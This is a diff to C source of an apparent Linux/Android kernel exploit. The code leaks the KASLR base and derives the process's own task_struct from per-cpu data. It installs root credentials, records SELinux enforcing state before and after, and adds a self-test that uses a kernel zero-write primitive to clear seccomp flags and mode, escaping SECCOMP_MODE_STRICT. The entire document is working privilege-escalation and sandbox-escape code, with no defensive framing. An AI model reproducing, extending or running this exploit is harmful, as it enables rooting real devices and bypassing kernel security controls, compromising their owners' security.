@@ -37,6 +37,8 @@
  */
 
 #include "common.h"
+#include <linux/seccomp.h>
+#include <linux/prctl.h>
 #include <stdarg.h>
 
 /* Raw, stdio-free emit. Once the cred install lands, stdio output from the
@@ -910,12 +912,13 @@ static int eqs_pick_top_cpu(void) {
   return sched_getcpu();
 }
 
-int slide_eqs_root_stage(void) {
-  if (!eqs_kaslr_base) {
-    pr_error("eqs stage-2 without a KASLR base\n");
-    return 0;
-  }
-
+/* Pin to the top online CPU and read this process's own task_struct through
+ * __per_cpu_offset[cpu] -> per-cpu __entry_task (the same derivation the
+ * standalone eqs exploit uses). Shared by stage-2, the seccomp self-test and the
+ * zero-write self-test's caller. `idx` continues the per-run slot sequence. */
+static int eqs_derive_own_task(int *idx, uint64_t *task_out, int *cpu_out) {
+  *task_out = 0;
+  *cpu_out = -1;
   int want_cpu = eqs_pick_top_cpu();
   if (want_cpu >= 0) {
     pin_to_core((size_t)want_cpu);
@@ -925,25 +928,20 @@ int slide_eqs_root_stage(void) {
   }
   int cpu = sched_getcpu();
   if (cpu < 0 || cpu > 63) {
-    pr_error("eqs stage-2 bad cpu=%d\n", cpu);
+    pr_error("eqs own-task bad cpu=%d\n", cpu);
     return 0;
   }
-  pr_success("eqs stage-2 enter cpu=%d want_cpu=%d pid=%d uid=%u "
-             "kaslr=%016llx\n",
-             cpu, want_cpu, getpid(), getuid(),
-             (unsigned long long)eqs_kaslr_base);
-
-  int idx = eqs_next_slot_idx; /* continue after the slots the leak consumed */
 
   uintptr_t percpu_slot = (uintptr_t)eqs_kaslr_base + EQS_OFF_PER_CPU_OFFSET +
                           (uintptr_t)cpu * sizeof(uint64_t);
   uint64_t percpu_delta = 0;
-  if (!eqs_read64(percpu_slot, &percpu_delta, "per_cpu_offset", &idx)) {
-    pr_error("eqs stage-2 per_cpu_offset read failed\n");
+  if (!eqs_read64(percpu_slot, &percpu_delta, "per_cpu_offset", idx)) {
+    pr_error("eqs own-task per_cpu_offset read failed\n");
     return 0;
   }
   if ((percpu_delta & (PAGE_SIZE - 1)) != 0) {
-    pr_error("eqs stage-2 per_cpu_offset not page aligned cpu=%d delta=%016llx\n",
+    pr_error("eqs own-task per_cpu_offset not page aligned cpu=%d "
+             "delta=%016llx\n",
              cpu, (unsigned long long)percpu_delta);
     return 0;
   }
@@ -951,18 +949,37 @@ int slide_eqs_root_stage(void) {
   uintptr_t entry_slot =
       (uintptr_t)eqs_kaslr_base + EQS_OFF_ENTRY_TASK + (uintptr_t)percpu_delta;
   uint64_t task = 0;
-  if (!eqs_read64(entry_slot, &task, "entry_task", &idx)) {
-    pr_error("eqs stage-2 __entry_task read failed\n");
+  if (!eqs_read64(entry_slot, &task, "entry_task", idx)) {
+    pr_error("eqs own-task __entry_task read failed\n");
     return 0;
   }
   if (task == 0 || (task >> 48) != 0xffff || (task & 7) != 0) {
-    pr_error("eqs stage-2 bad task=%016llx\n", (unsigned long long)task);
+    pr_error("eqs own-task bad task=%016llx\n", (unsigned long long)task);
     return 0;
   }
-  pr_success("eqs stage-2 task=%016llx entry_slot=%016zx percpu_delta=%016llx "
-             "cpu=%d\n",
-             (unsigned long long)task, entry_slot,
-             (unsigned long long)percpu_delta, cpu);
+  pr_success("eqs own-task cpu=%d entry_slot=%016zx percpu_delta=%016llx "
+             "task=%016llx\n",
+             cpu, entry_slot, (unsigned long long)percpu_delta,
+             (unsigned long long)task);
+  *task_out = task;
+  *cpu_out = cpu;
+  return 1;
+}
+
+int slide_eqs_root_stage(void) {
+  if (!eqs_kaslr_base) {
+    pr_error("eqs stage-2 without a KASLR base\n");
+    return 0;
+  }
+
+  int idx = eqs_next_slot_idx; /* continue after the slots the leak consumed */
+  uint64_t task = 0;
+  int cpu = -1;
+  if (!eqs_derive_own_task(&idx, &task, &cpu)) {
+    return 0;
+  }
+  pr_success("eqs stage-2 enter cpu=%d pid=%d uid=%u kaslr=%016llx\n", cpu,
+             getpid(), getuid(), (unsigned long long)eqs_kaslr_base);
 
   int enforcing = eqs_read_enforcing();
   pr_success("eqs stage-2 pre-cred selinux enforcing=%d\n", enforcing);
@@ -1038,4 +1055,86 @@ int slide_eqs_root_stage(void) {
   eqs_raw_emit("[+] eqs-stage2-summary selinux=%d->%d uid=%u euid=%u\n",
                enforcing, enforcing_after, getuid(), geteuid());
   return getuid() == 0 && geteuid() == 0;
+}
+
+/* End-to-end seccomp proof (GHOSTLOCK_SECCOMP_TEST=1). The parent first learns
+ * its OWN task_struct (so no racy child-task leak is needed), then installs
+ * SECCOMP_MODE_STRICT on itself and blocks in read()/write() only (the STRICT
+ * allowlist), while a pre-forked, filter-free child zero-writes the parent's
+ * thread_info.flags and seccomp.mode. If the clear worked, the parent's next
+ * getpid() is allowed; if it did not, STRICT SIGKILLs the parent (the device
+ * survives either way), so this can never BUG the kernel.
+ * STRICT is enough: mode 1 needs no BPF and no privileges. */
+int slide_eqs_seccomp_selftest(void) {
+  eqs_init_slot_rotation();
+  if (!eqs_kaslr_base && !slide_leak_kernel_base()) {
+    pr_error("eqs seccomp-selftest: KASLR leak failed\n");
+    return 0;
+  }
+  int idx = eqs_next_slot_idx;
+  uint64_t task = 0;
+  int cpu = -1;
+  if (!eqs_derive_own_task(&idx, &task, &cpu)) {
+    return 0;
+  }
+
+  int go[2] = {-1, -1};
+  int done[2] = {-1, -1};
+  if (pipe(go) != 0 || pipe(done) != 0) {
+    pr_error("eqs seccomp-selftest pipe failed errno=%d\n", errno);
+    return 0;
+  }
+
+  pid_t child = fork(); /* forked BEFORE STRICT: the child stays filter-free */
+  if (child < 0) {
+    pr_error("eqs seccomp-selftest fork failed errno=%d\n", errno);
+    return 0;
+  }
+  if (child == 0) {
+    close(go[1]);
+    close(done[0]);
+    char c = 0;
+    ssize_t nr = read(go[0], &c, 1); /* wait until STRICT is installed */
+    (void)nr;
+    int cleared = 0;
+    /* Same order as eqs_clear_seccomp: flags first, mode only if flags landed. */
+    if (slide_eqs_zero_write((uintptr_t)task + EQS_TASK_THREAD_INFO_FLAGS_OFF,
+                             "seccomp_flags", &idx)) {
+      if (slide_eqs_zero_write((uintptr_t)task + TASK_SECCOMP_OFF,
+                               "seccomp_mode", &idx)) {
+        cleared = 1;
+      }
+    }
+    char r = cleared ? 'Y' : 'N';
+    ssize_t nw = write(done[1], &r, 1);
+    (void)nw;
+    _exit(cleared ? 0 : 1);
+  }
+
+  close(go[0]);
+  close(done[1]);
+  if (prctl(PR_SET_SECCOMP, SECCOMP_MODE_STRICT) != 0) {
+    pr_error("eqs seccomp-selftest PR_SET_SECCOMP failed errno=%d\n", errno);
+    kill(child, SIGKILL);
+    waitpid(child, NULL, 0);
+    return 0;
+  }
+  /* From here on the parent may only use read/write/_exit/sigreturn. */
+  ssize_t gw = write(go[1], "G", 1);
+  (void)gw;
+  char r = 0;
+  ssize_t nr = read(done[0], &r, 1);
+  (void)nr;
+  if (r != 'Y') {
+    /* Clear failed; getpid() would be SIGKILLed, so report with write() only. */
+    eqs_raw_emit("[+] eqs-seccomp-selftest ok=0 child_cleared=%c\n",
+                 r ? r : '?');
+    _exit(0);
+  }
+  long pid = syscall(SYS_getpid); /* forbidden under STRICT -> SIGKILL if uncleared */
+  eqs_raw_emit("[+] eqs-seccomp-selftest ok=%d child_cleared=%c getpid=%ld "
+               "task=%016llx cpu=%d\n",
+               pid == (long)getpid() ? 1 : 0, r, pid,
+               (unsigned long long)task, cpu);
+  _exit(0);
 }
